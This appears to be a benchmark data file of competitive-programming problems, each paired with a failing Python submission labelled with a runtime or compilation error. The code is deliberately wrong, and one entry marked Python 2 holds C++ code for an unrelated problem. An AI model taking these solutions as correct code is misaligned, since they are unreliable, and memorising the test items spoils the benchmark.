{"difficulty":1300,"lang":"Python 2","lang_cluster":"python","src_uid":"88d56c1e3a7ffa94354ce0c70d8e958f","submission_id":"re_236","tags":["implementation","brute force"],"exec_outcome":"RUNTIME_ERROR","source_code":"n=int(raw_input())\nh,m=map(int,raw_input().split(':'))\nif (n==12 and h>11)or(n==24 and h>23):\n    h%=10\nif  m>59:\n    m%=10\nprint \"{0:02}:{1:02}\".format(h,m)","description":"You are given a broken clock. You know, that it is supposed to show time in 12- or 24-hours HH:MM format. In 12-hours format hours change from 1 to 12, while in 24-hours it changes from 0 to 23. In both formats minutes change from 0 to 59.You are given a time in format HH:MM that is currently displayed on the broken clock. Your goal is to change minimum number of digits in order to make clocks display the correct time in the given format.For example, if 00:99 is displayed, it is enough to replace the second 9 with 3 in order to get 00:39 that is a correct time in 24-hours format. However, to make 00:99 correct in 12-hours format, one has to change at least two digits. Additionally to the first change one can replace the second 0 with 1 and obtain 01:39.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains one integer 12 or 24, that denote 12-hours or 24-hours format respectively. The second line contains the time in format HH:MM, that is currently displayed on the clock. First two characters stand for the hours, while next two show the minutes.","output_spec":"The only line of the output should contain the time in format HH:MM that is a correct time in the given format. It should differ from the original in as few positions as possible. If there are many optimal solutions you can print any of them.","notes":null,"sample_inputs":["24\n17:30","12\n17:30","24\n99:99"],"sample_outputs":["17:30","07:30","09:09"]}
{"difficulty":1400,"lang":"Python 3","lang_cluster":"python","src_uid":"8a9adc116abbd387a6a64dd754436f8a","submission_id":"re_1038","tags":["brute force","math"],"exec_outcome":"RUNTIME_ERROR","source_code":"a,b,n = map(int,input().split())\nans = \"No solution\"\n\nif a == 0 and b == 0:\n    ans =5\nelif a == 0 and b!= 0:\n    ans\nelif a != 0 and b == 0:\n    ans = 0\nelse:\n    a = b \/ a\n    if a < 0 :\n        a = abs(a)\n        b = 0\n    for i in range(1001):\n        if i ** n == a:\n            ans = i\n\n    if b == 0 :ans = - ans\n\nprint(ans)\n","description":"A long time ago in some far country lived king Copa. After the recent king's reform, he got so large powers that started to keep the books by himself.The total income A of his kingdom during 0-th year is known, as well as the total income B during n-th year (these numbers can be negative \u2014 it means that there was a loss in the correspondent year). King wants to show financial stability. To do this, he needs to find common coefficient X \u2014 the coefficient of income growth during one year. This coefficient should satisfy the equation:A\u00b7Xn\u2009=\u2009B.Surely, the king is not going to do this job by himself, and demands you to find such number X.It is necessary to point out that the fractional numbers are not used in kingdom's economy. That's why all input numbers as well as coefficient X must be integers. The number X may be zero or negative.","input_from":"standard input","output_to":"standard output","input_spec":"The input contains three integers A, B, n (|A|,\u2009|B|\u2009\u2264\u20091000, 1\u2009\u2264\u2009n\u2009\u2264\u200910).","output_spec":"Output the required integer coefficient X, or \u00abNo solution\u00bb, if such a coefficient does not exist or it is fractional. If there are several possible solutions, output any of them.","notes":null,"sample_inputs":["2 18 2","-1 8 3","0 0 10","1 16 5"],"sample_outputs":["3","-2","5","No solution"]}
{"difficulty":1400,"lang":"Python 2","lang_cluster":"python","src_uid":"991516fa6f3ed5a71c547a3a50ea1a2b","submission_id":"re_1042","tags":["brute force"],"exec_outcome":"RUNTIME_ERROR","source_code":"n,l = [int(nl) for nl in raw_input().split(\" \")]\na = [int(ai) for ai in raw_input().split(\" \")]\nans = 0\nsma = sum(a)\nfor lx in range(l,sma+1):\n\tansx = sma\/lx\n\tif (ansx*lx) > ans:\n\t\tans = ansx * lx\nprint ans","description":"The blinds are known to consist of opaque horizontal stripes that can be rotated thus regulating the amount of light flowing in the room. There are n blind stripes with the width of 1 in the factory warehouse for blind production. The problem is that all of them are spare details from different orders, that is, they may not have the same length (it is even possible for them to have different lengths)Every stripe can be cut into two or more parts. The cuttings are made perpendicularly to the side along which the length is measured. Thus the cuttings do not change the width of a stripe but each of the resulting pieces has a lesser length (the sum of which is equal to the length of the initial stripe)After all the cuttings the blinds are constructed through consecutive joining of several parts, similar in length, along sides, along which length is measured. Also, apart from the resulting pieces an initial stripe can be used as a blind if it hasn't been cut. It is forbidden to construct blinds in any other way.Thus, if the blinds consist of k pieces each d in length, then they are of form of a rectangle of k\u2009\u00d7\u2009d bourlemeters. Your task is to find for what window possessing the largest possible area the blinds can be made from the given stripes if on technical grounds it is forbidden to use pieces shorter than l bourlemeter. The window is of form of a rectangle with side lengths as positive integers.","input_from":"standard input","output_to":"standard output","input_spec":"The first output line contains two space-separated integers n and l (1\u2009\u2264\u2009n,\u2009l\u2009\u2264\u2009100). They are the number of stripes in the warehouse and the minimal acceptable length of a blind stripe in bourlemeters. The second line contains space-separated n integers ai. They are the lengths of initial stripes in bourlemeters (1\u2009\u2264\u2009ai\u2009\u2264\u2009100).","output_spec":"Print the single number \u2014 the maximal area of the window in square bourlemeters that can be completely covered. If no window with a positive area that can be covered completely without breaking any of the given rules exist, then print the single number 0.","notes":"NoteIn the first sample test the required window is 2\u2009\u00d7\u20094 in size and the blinds for it consist of 4 parts, each 2 bourlemeters long. One of the parts is the initial stripe with the length of 2, the other one is a part of a cut stripe with the length of 3 and the two remaining stripes are parts of a stripe with the length of 4 cut in halves.","sample_inputs":["4 2\n1 2 3 4","5 3\n5 5 7 3 1","2 3\n1 2"],"sample_outputs":["8","15","0"]}
{"difficulty":1100,"lang":"Python 3","lang_cluster":"python","src_uid":"9c90974a0bb860a5e180760042fd5045","submission_id":"re_575","tags":["implementation","strings"],"exec_outcome":"RUNTIME_ERROR","source_code":"n,m = list(map(int, input().split()))\n\narr = []\nfor _ in range(n):\n    arr.append(list(input()))\n\nfrom collections import defaultdict\n\nvisited = defaultdict(lambda: [0] * m)\nincluded = defaultdict(lambda: [True] * m)\n\n\ndef find_for_row_and_cols(row_index, value):\n    vals = []\n    for i in range(m):\n        if arr[row_index][i] == value:\n            vals.append((row_index, i))\n\n\n    for i in range(n):\n        if arr[i][col_index] == value:\n            vals.append((i, col_index))\n    return vals\n\n# def find_for_cols(col_index,)\n\n\ndef find_and_mark(row_index, col_index, value):\n    if visited[row_index][col_index]: return\n\n    vals = find_for_row_and_cols(row_index, value)\n    visited[row_index][col_index] = 1\n    if len(vals) > 2:\n        for i, j in vals:\n            included[i][j] = False\n\n            if i == row_index and j == col_index:\n                continue\n            find_and_mark(row_index, col_index, value)\n\nfor row_index, row in enumerate(arr):\n    for col_index, value in enumerate(row):\n        if not visited[row_index][col_index]:\n            find_and_mark(row_index, col_index, value)\n\nans = []\nfor row_index, row in enumerate(arr):\n    for col_index, value in enumerate(row):\n        if included[row_index][col_index]:\n            ans.append(arr[row_index][col_index])\n\nprint(''.join(ans))","description":"An African crossword is a rectangular table n\u2009\u00d7\u2009m in size. Each cell of the table contains exactly one letter. This table (it is also referred to as grid) contains some encrypted word that needs to be decoded.To solve the crossword you should cross out all repeated letters in rows and columns. In other words, a letter should only be crossed out if and only if the corresponding column or row contains at least one more letter that is exactly the same. Besides, all such letters are crossed out simultaneously.When all repeated letters have been crossed out, we should write the remaining letters in a string. The letters that occupy a higher position follow before the letters that occupy a lower position. If the letters are located in one row, then the letter to the left goes first. The resulting word is the answer to the problem.You are suggested to solve an African crossword and print the word encrypted there.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and m (1\u2009\u2264\u2009n,\u2009m\u2009\u2264\u2009100). Next n lines contain m lowercase Latin letters each. That is the crossword grid.","output_spec":"Print the encrypted word on a single line. It is guaranteed that the answer consists of at least one letter.","notes":null,"sample_inputs":["3 3\ncba\nbcd\ncbc","5 5\nfcofd\nooedo\nafaoa\nrdcdf\neofsf"],"sample_outputs":["abcd","codeforces"]}
{"difficulty":1400,"lang":"Python 2","lang_cluster":"python","src_uid":"a37df9b239a40473516d1525d56a0da7","submission_id":"re_791","tags":["combinatorics"],"exec_outcome":"RUNTIME_ERROR","source_code":"#include <bits\/stdc++.h>\n#define ll long long\n#define M 1000000007\n#define INF 9223372036854775807\n#define mp(x,y) make_pair(x,y)\n#define pb(x) push_back(x)\n#define pmp(x,y) pb(mp(x,y))\n#define ld double\n#define PI 3.14159265\n#define len(a) (ll)a.size()\n#define F first\n#define S second\n#define ch cout<<\"debug\\n\"\n#define fast() ios_base::sync_with_stdio(0); cin.tie(0); cout.tie(0)\nusing namespace std;\n\nll a[2001][2001],n,b[2001][2001];\n\nvoid pre()\n{\n\tll sum=0;\n\t\t\n\tfor(ll k=0;k<n;k++)\n\t{\n\t\n\t\tsum=0;\n\t\t\n\t\tfor(ll i=0;i<n-k;i++)\n\t\t\tsum+=a[i][i+k];\n\t\t\n\t\tfor(ll i=0;i<n-k;i++)\n\t\t\tb[i][i+k]=sum;\n\t\t\t\n\t\tsum=0;\n\t\t\n\t\tfor(ll i=0;i<n-k;i++)\n\t\t\tsum+=a[i+k][i];\n\t\t\n\t\tfor(ll i=0;i<n-k;i++)\n\t\t\tb[i+k][i]=sum;\n\t}\n\n\tfor(ll k=0;k<n;k++)\n\t{\n\t\tsum=0;\n\t\t\n\t\tfor(ll i=0;i<n-k;i++)\n\t\t\tsum+=a[i+k][n-1-i];\n\t\t\n\t\tfor(ll i=0;i<n-k;i++)\n\t\t\tb[i+k][n-1-i]+=sum;\n\t\t\t\n\t\t\n\t\tsum=0;\n\t\t\n\t\tfor(ll i=0;i<n-k;i++)\n\t\t\tsum+=a[i][n-1-i-k];\n\t\t\n\t\tif(k!=0)\t\t\n\t\tfor(ll i=0;i<n-k;i++)\n\t\t\tb[i][n-1-i-k]+=sum;\n\n\t}\n\t\n\tfor(ll i=0;i<n;i++)\n\t\tfor(ll j=0;j<n;j++)\n\t\t\tb[i][j]-=a[i][j];\n}\n\nvoid pre2(){\n\t\n\tll ans1=0,ans2=0;\n\tfor(ll i=0;i<n;i++)\n\t{\n\t\tfor(ll j=0;j<n;j++)\n\t\t{\n\t\t\tif((i+j)%2)\n\t\t\t\tans1=max(ans1,b[i][j]);\n\t\t\t\n\t\t\telse\n\t\t\t\tans2=max(ans2,b[i][j]);\t\n\t\t}\n\t}\n\t\n\tcout<<ans1+ans2<<endl;\n\t\n\tfor(ll i=0;i<n;i++)\n\t{\n\t\tfor(ll j=0;j<n;j++)\n\t\t{\n\t\t\tif((i+j)%2 and ans1==b[i][j])\n\t\t\t{\n\t\t\t\tcout<<i+1<<\" \"<<j+1<<\" \";\n\t\t\t\tans1=-1;\n\t\t\t}\n\t\t\t\n\t\t\telse if(ans2==b[i][j] and (i+j)%2==0)\n\t\t\t{\n\t\t\t\tcout<<i+1<<\" \"<<j+1<<\" \";\n\t\t\t\tans2=-1;\n\t\t\t}\n\t\t}\t\n\t}\n\t\n}\n\nvoid print()\n{\n\tcout<<endl;\n\tfor(ll i=0;i<n;i++){\n\t\tfor(ll j=0;j<n;j++)\n\t\t\tcout<<b[i][j]<<\" \";\n\t\tcout<<endl;\t\n\t}\n}\n\nint main(){\t\n\n\tfast();\n\tcin>>n;\n\tfor(ll i=0;i<n;i++)\n\t\tfor(ll j=0;j<n;j++)\n\t\t\tcin>>a[i][j];\n\n\tpre();\n\/\/\tprint();\n\tpre2();\t\n\treturn 0;\n}\n","description":"One day little Vasya found mom's pocket book. The book had n names of her friends and unusually enough, each name was exactly m letters long. Let's number the names from 1 to n in the order in which they are written.As mom wasn't home, Vasya decided to play with names: he chose three integers i, j, k (1\u2009\u2264\u2009i\u2009&lt;\u2009j\u2009\u2264\u2009n, 1\u2009\u2264\u2009k\u2009\u2264\u2009m), then he took names number i and j and swapped their prefixes of length k. For example, if we take names \"CBDAD\" and \"AABRD\" and swap their prefixes with the length of 3, the result will be names \"AABAD\" and \"CBDRD\".You wonder how many different names Vasya can write instead of name number 1, if Vasya is allowed to perform any number of the described actions. As Vasya performs each action, he chooses numbers i, j, k independently from the previous moves and his choice is based entirely on his will. The sought number can be very large, so you should only find it modulo 1000000007 (109\u2009+\u20097).","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains two integers n and m (1\u2009\u2264\u2009n,\u2009m\u2009\u2264\u2009100) \u2014 the number of names and the length of each name, correspondingly. Then n lines contain names, each name consists of exactly m uppercase Latin letters.","output_spec":"Print the single number \u2014 the number of different names that could end up in position number 1 in the pocket book after the applying the procedures described above. Print the number modulo 1000000007 (109\u2009+\u20097).","notes":"NoteIn the first sample Vasya can get the following names in the position number 1: \"AAB\", \"AAA\", \"BAA\" and \"BAB\".","sample_inputs":["2 3\nAAB\nBAA","4 5\nABABA\nBCGDG\nAAAAA\nYABSA"],"sample_outputs":["4","216"]}
{"difficulty":1500,"lang":"Python 2","lang_cluster":"python","src_uid":"b0301a2d79a1ec126511ed769ec0b743","submission_id":"re_905","tags":["bitmasks","brute force","graphs"],"exec_outcome":"RUNTIME_ERROR","source_code":"n,m=map(int,raw_input().split())\ns=[raw_input() for i in range(n)]\np=set(tuple(raw_input().split()) for i in range(m))\nfrom itertools import *\nfor i in range(n,0,-1):\n    for c in combinations(s,i):\n        g=0\n        for x in c:\n            for y in c:\n                if x !=y and (x,y) in p:\n                    g=1\n        if not g:\n            print len(c)\n            print '\\n'.join(c)\n            exit()","description":"When little Petya grew up and entered the university, he started to take part in \u0410\u0421\u041c contests. Later he realized that he doesn't like how the \u0410\u0421\u041c contests are organised: the team could only have three members (and he couldn't take all his friends to the competitions and distribute the tasks between the team members efficiently), so he decided to organize his own contests PFAST Inc. \u2014 Petr and Friends Are Solving Tasks Corporation. PFAST Inc. rules allow a team to have unlimited number of members.To make this format of contests popular he organised his own tournament. To create the team he will prepare for the contest organised by the PFAST Inc. rules, he chose several volunteers (up to 16 people) and decided to compile a team from them. Petya understands perfectly that if a team has two people that don't get on well, then the team will perform poorly. Put together a team with as many players as possible given that all players should get on well with each other.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integer numbers n (1\u2009\u2264\u2009n\u2009\u2264\u200916) \u2014 the number of volunteers, and m () \u2014 the number of pairs that do not get on. Next n lines contain the volunteers' names (each name is a non-empty string consisting of no more than 10 uppercase and\/or lowercase Latin letters). Next m lines contain two names \u2014 the names of the volunteers who do not get on. The names in pair are separated with a single space. Each pair of volunteers who do not get on occurs exactly once. The strings are case-sensitive. All n names are distinct.","output_spec":"The first output line should contain the single number k \u2014 the number of people in the sought team. Next k lines should contain the names of the sought team's participants in the lexicographical order. If there are several variants to solve the problem, print any of them. Petya might not be a member of the sought team. ","notes":null,"sample_inputs":["3 1\nPetya\nVasya\nMasha\nPetya Vasya","3 0\nPasha\nLesha\nVanya"],"sample_outputs":["2\nMasha\nPetya","3\nLesha\nPasha\nVanya"]}
{"difficulty":1100,"lang":"Python 3","lang_cluster":"python","src_uid":"b1ef19d7027dc82d76859d64a6f43439","submission_id":"re_463","tags":["implementation","strings"],"exec_outcome":"RUNTIME_ERROR","source_code":"import collections\nl=list(input())\np=list(input())\n#print(p)\n#print(l)\ncl=collections.Counter(l)\npl=collections.Counter(p)\n#print(cl)\n#print(pl)\nplk=list(pl.keys())\nprint(plk)\nif ' ' in plk:\n    plk.remove(' ')\nelse:\n    pass\nn=len(plk)\ni=0\ner=0\n#print(cl['s'])\nwhile i<n:\n    h=plk[i]\n    t=cl[h]\n    q=pl[h]\n    #print(t)\n    #print(q)\n    if t>=q:\n        er+=1\n    else:\n        pass\n    i+=1\n#print(n)\n#print(er)\nif er==n:\n    print('YES')\n\nelse:\n    print('NO')\n\n\n","description":"Vasya decided to write an anonymous letter cutting the letters out of a newspaper heading. He knows heading s1 and text s2 that he wants to send. Vasya can use every single heading letter no more than once. Vasya doesn't have to cut the spaces out of the heading \u2014 he just leaves some blank space to mark them. Help him; find out if he will manage to compose the needed text.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a newspaper heading s1. The second line contains the letter text s2. s1 \u0438 s2 are non-empty lines consisting of spaces, uppercase and lowercase Latin letters, whose lengths do not exceed 200 symbols. The uppercase and lowercase letters should be differentiated. Vasya does not cut spaces out of the heading.","output_spec":"If Vasya can write the given anonymous letter, print YES, otherwise print NO","notes":null,"sample_inputs":["Instead of dogging Your footsteps it disappears but you dont notice anything\nwhere is your dog","Instead of dogging Your footsteps it disappears but you dont notice anything\nYour dog is upstears","Instead of dogging your footsteps it disappears but you dont notice anything\nYour dog is upstears","abcdefg hijk\nk j i h g f e d c b a"],"sample_outputs":["NO","YES","NO","YES"]}
{"difficulty":1000,"lang":"Python 2","lang_cluster":"python","src_uid":"bdd86c8bc54bbac6e2bb5a9d68b6eb1c","submission_id":"re_378","tags":["greedy"],"exec_outcome":"RUNTIME_ERROR","source_code":"# prob B\n\nn = input()\nseq = raw_input()\n\nseq = [int(i) for i in seq.split()]\nseq.sort()\n\ntot = 0\nfor i, j in zip(seq, range(1, n+1)):\n    if i != j:\n        tot += 1\n\nprint tot\n","description":"\"Hey, it's homework time\" \u2014 thought Polycarpus and of course he started with his favourite subject, IT. Polycarpus managed to solve all tasks but for the last one in 20 minutes. However, as he failed to solve the last task after some considerable time, the boy asked you to help him.The sequence of n integers is called a permutation if it contains all integers from 1 to n exactly once.You are given an arbitrary sequence a1,\u2009a2,\u2009...,\u2009an containing n integers. Each integer is not less than 1 and not greater than 5000. Determine what minimum number of elements Polycarpus needs to change to get a permutation (he should not delete or add numbers). In a single change he can modify any single sequence element (i. e. replace it with another integer).","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input data contains an integer n (1\u2009\u2264\u2009n\u2009\u2264\u20095000) which represents how many numbers are in the sequence. The second line contains a sequence of integers ai (1\u2009\u2264\u2009ai\u2009\u2264\u20095000,\u20091\u2009\u2264\u2009i\u2009\u2264\u2009n).","output_spec":"Print the only number \u2014 the minimum number of changes needed to get the permutation.","notes":"NoteThe first sample contains the permutation, which is why no replacements are required.In the second sample it is enough to replace the first element with the number 1 and that will make the sequence the needed permutation.In the third sample we can replace the second element with number 4 and the fourth element with number 2.","sample_inputs":["3\n3 1 2","2\n2 2","5\n5 3 3 3 1"],"sample_outputs":["0","1","2"]}
{"difficulty":1200,"lang":"PyPy 3","lang_cluster":"python","src_uid":"c31fed523230af1f904218b2fe0d663d","submission_id":"re_952","tags":["implementation","sortings"],"exec_outcome":"RUNTIME_ERROR","source_code":"#_________________ Mukul Mohan Varshney _______________#\n\n#Template\nimport sys\nimport os\nimport math\nimport copy\nfrom math import gcd\nfrom bisect import bisect\nfrom io import BytesIO, IOBase\nfrom math import sqrt,floor,factorial,gcd,log,ceil\nfrom collections import deque,Counter,defaultdict\nfrom itertools import permutations, combinations\n\n#define function \ndef Int(): return int(sys.stdin.readline())\ndef Mint(): return map(int,sys.stdin.readline().split())\ndef Lstr(): return list(sys.stdin.readline().strip())\ndef Str(): return sys.stdin.readline().strip()\ndef Mstr(): return map(str,sys.stdin.readline().strip().split())\ndef List(): return list(map(int,sys.stdin.readline().split()))\ndef Hash(): return dict()\ndef Mod(): return 1000000007\ndef Ncr(n,r,p): return ((fact[n])*((ifact[r]*ifact[n-r])%p))%p\ndef Most_frequent(list): return max(set(list), key = list.count)\ndef Mat2x2(n): return [List() for _ in range(n)]\ndef btod(n): \n    return int(n,2) \n    \ndef dtob(n): \n    return bin(n).replace(\"0b\",\"\")    \n\n \n# Driver Code \t\ndef solution():\n     #for _ in range(Int()):\n          n,t=Mint()\n          ans=[]\n          for i in range(n):\n               x,y=Mint()\n               ans.append([2*x-y,2*x+y])\n          mukul=2\n          ans.sort()\n          for i in range(1,len(ans)):\n               \n               res=(ans[i][0]-ans[i-1][1])\n               print(res)\n               if(res>2*t):\n                    mukul+=2\n               elif(res==2*t):\n                    mukul+=1\n          print(mukul)          \n\n               \n#Call the solve function          \nif __name__ == \"__main__\":\n     \n     solution()  ","description":"A new cottage village called \u00abFlatville\u00bb is being built in Flatland. By now they have already built in \u00abFlatville\u00bb n square houses with the centres on the \u041ex-axis. The houses' sides are parallel to the coordinate axes. It's known that no two houses overlap, but they can touch each other.The architect bureau, where Peter works, was commissioned to build a new house in \u00abFlatville\u00bb. The customer wants his future house to be on the \u041ex-axis, to be square in shape, have a side t, and touch at least one of the already built houses. For sure, its sides should be parallel to the coordinate axes, its centre should be on the Ox-axis and it shouldn't overlap any of the houses in the village.Peter was given a list of all the houses in \u00abFlatville\u00bb. Would you help him find the amount of possible positions of the new house?","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input data contains numbers n and t (1\u2009\u2264\u2009n,\u2009t\u2009\u2264\u20091000). Then there follow n lines, each of them contains two space-separated integer numbers: xi ai, where xi \u2014 x-coordinate of the centre of the i-th house, and ai \u2014 length of its side (\u2009-\u20091000\u2009\u2264\u2009xi\u2009\u2264\u20091000, 1\u2009\u2264\u2009ai\u2009\u2264\u20091000).","output_spec":"Output the amount of possible positions of the new house.","notes":"NoteIt is possible for the x-coordinate of the new house to have non-integer value.","sample_inputs":["2 2\n0 4\n6 2","2 2\n0 4\n5 2","2 3\n0 4\n5 2"],"sample_outputs":["4","3","2"]}
{"difficulty":1200,"lang":"Python 3","lang_cluster":"python","src_uid":"c3244e952830643938d51ce14f043d7d","submission_id":"re_570","tags":["strings"],"exec_outcome":"COMPILATION_ERROR","source_code":"\"\"\"\nPeter likes to travel by train. He likes it so much that on the train he falls asleep.\n\nOnce in summer Peter was going by train from city A to city B, and as usual, was sleeping. Then he woke up, started to look through the window and noticed that every railway station has a flag of a particular colour.\n\nThe boy started to memorize the order of the flags' colours that he had seen. But soon he fell asleep again. Unfortunately, he didn't sleep long, he woke up and went on memorizing the colours. Then he fell asleep again, and that time he slept till the end of the journey.\n\nAt the station he told his parents about what he was doing, and wrote two sequences of the colours that he had seen before and after his sleep, respectively.\n\nPeter's parents know that their son likes to fantasize. They give you the list of the flags' colours at the stations that the train passes sequentially on the way from A to B, and ask you to find out if Peter could see those sequences on the way from A to B, or from B to A. Remember, please, that Peter had two periods of wakefulness.\n\nPeter's parents put lowercase Latin letters for colours. The same letter stands for the same colour, different letters \u2014 for different colours.\n\nInput\nThe input data contains three lines. The first line contains a non-empty string, whose length does not exceed 105, the string consists of lowercase Latin letters \u2014 the flags' colours at the stations on the way from A to B. On the way from B to A the train passes the same stations, but in reverse order.\n\nThe second line contains the sequence, written by Peter during the first period of wakefulness. The third line contains the sequence, written during the second period of wakefulness. Both sequences are non-empty, consist of lowercase Latin letters, and the length of each does not exceed 100 letters. Each of the sequences is written in chronological order.\n\nOutput\nOutput one of the four words without inverted commas:\n\n\u00abforward\u00bb \u2014 if Peter could see such sequences only on the way from A to B;\n\u00abbackward\u00bb \u2014 if Peter could see such sequences on the way from B to A;\n\u00abboth\u00bb \u2014 if Peter could see such sequences both on the way from A to B, and on the way from B to A;\n\u00abfantasy\u00bb \u2014 if Peter could not see such sequences.\n\"\"\"\n\n\nx = input()\nx_reversed = ''.join(list(reversed(x)))\n\nseq1 = input()\nseq2 = input()\n\nif len(seq1) + len(seq2) > len(x): # if sum of peter's colors exceed the whole number of colors\n\tprint('fantasy')\nelse:\n\tforward = False\n\tbackward = False\n\n\tif seq1 in x:\n\t\tif seq2 in x[x.find(seq1) + len(seq1):]\n\t\t\tforward = True\n\n\tif seq1 in x_reversed:\n\t\tif seq2 in x_reversed[x_reversed.find(seq1) + len(seq1):]\n\t\t\tbackward = True\n\n\tif forward and backward:\n\t\tprint('both')\n\telif forward:\n\t\tprint(\"forward\")\n\telif backward:\n\t\tprint(\"backward\")\n\telse:\n\t\tprint('fantasy')","description":"Peter likes to travel by train. He likes it so much that on the train he falls asleep. Once in summer Peter was going by train from city A to city B, and as usual, was sleeping. Then he woke up, started to look through the window and noticed that every railway station has a flag of a particular colour.The boy started to memorize the order of the flags' colours that he had seen. But soon he fell asleep again. Unfortunately, he didn't sleep long, he woke up and went on memorizing the colours. Then he fell asleep again, and that time he slept till the end of the journey.At the station he told his parents about what he was doing, and wrote two sequences of the colours that he had seen before and after his sleep, respectively.Peter's parents know that their son likes to fantasize. They give you the list of the flags' colours at the stations that the train passes sequentially on the way from A to B, and ask you to find out if Peter could see those sequences on the way from A to B, or from B to A. Remember, please, that Peter had two periods of wakefulness.Peter's parents put lowercase Latin letters for colours. The same letter stands for the same colour, different letters \u2014 for different colours.","input_from":"standard input","output_to":"standard output","input_spec":"The input data contains three lines. The first line contains a non-empty string, whose length does not exceed 105, the string consists of lowercase Latin letters \u2014 the flags' colours at the stations on the way from A to B. On the way from B to A the train passes the same stations, but in reverse order.  The second line contains the sequence, written by Peter during the first period of wakefulness. The third line contains the sequence, written during the second period of wakefulness. Both sequences are non-empty, consist of lowercase Latin letters, and the length of each does not exceed 100 letters. Each of the sequences is written in chronological order. ","output_spec":"Output one of the four words without inverted commas:    \u00abforward\u00bb \u2014 if Peter could see such sequences only on the way from A to B;  \u00abbackward\u00bb \u2014 if Peter could see such sequences on the way from B to A;  \u00abboth\u00bb \u2014 if Peter could see such sequences both on the way from A to B, and on the way from B to A;  \u00abfantasy\u00bb \u2014 if Peter could not see such sequences. ","notes":"NoteIt is assumed that the train moves all the time, so one flag cannot be seen twice. There are no flags at stations A and B.","sample_inputs":["atob\na\nb","aaacaaa\naca\naa"],"sample_outputs":["forward","both"]}
{"difficulty":1200,"lang":"Python 3","lang_cluster":"python","src_uid":"cb4dbff31d967c3dab8fe0495eb871dc","submission_id":"re_417","tags":["dsu","dfs and similar","brute force","graphs"],"exec_outcome":"RUNTIME_ERROR","source_code":"n = int(input())\n\ncoodenadas = []\nfor i in range(n):\n    x, y = [ int(i) for i in input().split() ]\n    coodenadas.append([x, y, {\n        'x': { x },\n        'y': { y }\n    }])\n\naux = 0\nfor i in range(n):\n    j = i + 1\n    grafo = coodenadas[i][2]\n    while j < len(coodenadas):\n        x = coodenadas[j][0]\n        y = coodenadas[j][1]\n        if j != i and (x in grafo['x'] or y in grafo['y']):\n            aux += 1\n            grafo['x'].add(x)\n            grafo['y'].add(y)\n            coodenadas[j][2] = grafo\n        j += 1\n\nprint(n - aux - 1)","description":"Bajtek is learning to skate on ice. He's a beginner, so his only mode of transportation is pushing off from a snow drift to the north, east, south or west and sliding until he lands in another snow drift. He has noticed that in this way it's impossible to get from some snow drifts to some other by any sequence of moves. He now wants to heap up some additional snow drifts, so that he can get from any snow drift to any other one. He asked you to find the minimal number of snow drifts that need to be created.We assume that Bajtek can only heap up snow drifts at integer coordinates.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of input contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009100) \u2014 the number of snow drifts. Each of the following n lines contains two integers xi and yi (1\u2009\u2264\u2009xi,\u2009yi\u2009\u2264\u20091000) \u2014 the coordinates of the i-th snow drift. Note that the north direction coin\u0441ides with the direction of Oy axis, so the east direction coin\u0441ides with the direction of the Ox axis. All snow drift's locations are distinct.","output_spec":"Output the minimal number of snow drifts that need to be created in order for Bajtek to be able to reach any snow drift from any other one.","notes":null,"sample_inputs":["2\n2 1\n1 2","2\n2 1\n4 1"],"sample_outputs":["1","0"]}
{"difficulty":1100,"lang":"Python 3","lang_cluster":"python","src_uid":"d526af933b5afe9abfdf9815e9664144","submission_id":"re_560","tags":["implementation","brute force"],"exec_outcome":"RUNTIME_ERROR","source_code":"n=int(input())\na=list(map(int,input().split()))\nans=1e9\nfor i in range(n-1):\n    ans=min(ans,max(a[i],a[i+1]))\nprint(ans)\n","description":"In Berland the opposition is going to arrange mass walking on the boulevard. The boulevard consists of n tiles that are lain in a row and are numbered from 1 to n from right to left. The opposition should start walking on the tile number 1 and the finish on the tile number n. During the walk it is allowed to move from right to left between adjacent tiles in a row, and jump over a tile. More formally, if you are standing on the tile number i (i\u2009&lt;\u2009n\u2009-\u20091), you can reach the tiles number i\u2009+\u20091 or the tile number i\u2009+\u20092 from it (if you stand on the tile number n\u2009-\u20091, you can only reach tile number n). We can assume that all the opposition movements occur instantaneously.In order to thwart an opposition rally, the Berland bloody regime organized the rain. The tiles on the boulevard are of poor quality and they are rapidly destroyed in the rain. We know that the i-th tile is destroyed after ai days of rain (on day ai tile isn't destroyed yet, and on day ai\u2009+\u20091 it is already destroyed). Of course, no one is allowed to walk on the destroyed tiles! So the walk of the opposition is considered thwarted, if either the tile number 1 is broken, or the tile number n is broken, or it is impossible to reach the tile number n from the tile number 1 if we can walk on undestroyed tiles.The opposition wants to gather more supporters for their walk. Therefore, the more time they have to pack, the better. Help the opposition to calculate how much time they still have and tell us for how many days the walk from the tile number 1 to the tile number n will be possible.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009103) \u2014 the boulevard's length in tiles. The second line contains n space-separated integers ai \u2014 the number of days after which the i-th tile gets destroyed (1\u2009\u2264\u2009ai\u2009\u2264\u2009103). ","output_spec":"Print a single number \u2014 the sought number of days.","notes":"NoteIn the first sample the second tile gets destroyed after day three, and the only path left is 1\u2009\u2192\u20093\u2009\u2192\u20094. After day five there is a two-tile gap between the first and the last tile, you can't jump over it.In the second sample path 1\u2009\u2192\u20093\u2009\u2192\u20095 is available up to day five, inclusive. On day six the last tile is destroyed and the walk is thwarted.","sample_inputs":["4\n10 3 5 10","5\n10 2 8 3 5"],"sample_outputs":["5","5"]}
